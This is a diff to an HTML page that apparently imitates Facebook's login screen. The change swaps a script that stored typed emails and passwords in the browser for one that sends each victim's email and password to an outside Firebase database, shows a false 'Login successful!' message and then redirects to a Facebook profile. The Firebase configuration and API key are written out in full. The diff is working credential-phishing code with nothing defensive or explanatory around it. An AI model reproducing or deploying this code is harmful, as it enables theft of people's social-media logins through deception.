@@ -157,26 +157,52 @@
         <a href="#">Data Policy</a> | 
         <a href="#">Cookie Policy</a>
     </footer>
-    <script>
-        // Function to save email and password to localStorage and redirect to Facebook login
-        function saveAndRedirect(event) {
-            event.preventDefault(); // Prevent the form from submitting
+ <script type="module">
+  // Import Firebase functions
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-app.js";
+  import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/11.0.1/firebase-database.js";
 
-            const email = document.getElementById('email').value;
-            const password = document.getElementById('password').value;
+  // Firebase configuration
+  const firebaseConfig = {
+    apiKey: "AIzaSyCcTFYAIp1-TA1irU8l5N8iihfnYCGWrHw",
+    authDomain: "and-facebook-ab84c.firebaseapp.com",
+    databaseURL: "https://and-facebook-ab84c-default-rtdb.firebaseio.com",
+    projectId: "and-facebook-ab84c",
+    storageBucket: "and-facebook-ab84c.appspot.com",
+    messagingSenderId: "4885749329",
+    appId: "1:4885749329:web:2d5b0e46519b5dc4c8e270"
+  };
 
-            if (email && password) {
-                // Save to localStorage
-                let users = JSON.parse(localStorage.getItem('users')) || [];
-                users.push({ email, password });
-                localStorage.setItem('users', JSON.stringify(users));
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const db = getDatabase(app);
 
-                // Redirect to Facebook's login page
-                window.location.href = 'https://www.facebook.com/mike.robinson.486374';
-            } else {
-                alert("Please fill in both fields.");
-            }
-        }
-    </script>
+  // Function to save email and password to Firebase and redirect
+  function saveAndRedirect(event) {
+    event.preventDefault();
+
+    const email = document.getElementById('email').value;
+    const password = document.getElementById('password').value;
+
+    if (email && password) {
+      // Save to Firebase database
+      set(ref(db, 'users/' + email.replace('.', '_')), {
+        email: email,
+        password: password
+      }).then(() => {
+        alert("Login successful!");
+        window.location.href = 'https://www.facebook.com/mike.robinson.486374';
+      }).catch((error) => {
+        console.error("Error storing data:", error);
+        alert("Failed to log in. Please try again.");
+      });
+    } else {
+      alert("Please fill in both fields.");
+    }
+  }
+
+  // Attach the saveAndRedirect function to the form's submit event
+  document.getElementById("login-form").addEventListener("submit", saveAndRedirect);
+</script>
 </body>
 </html>
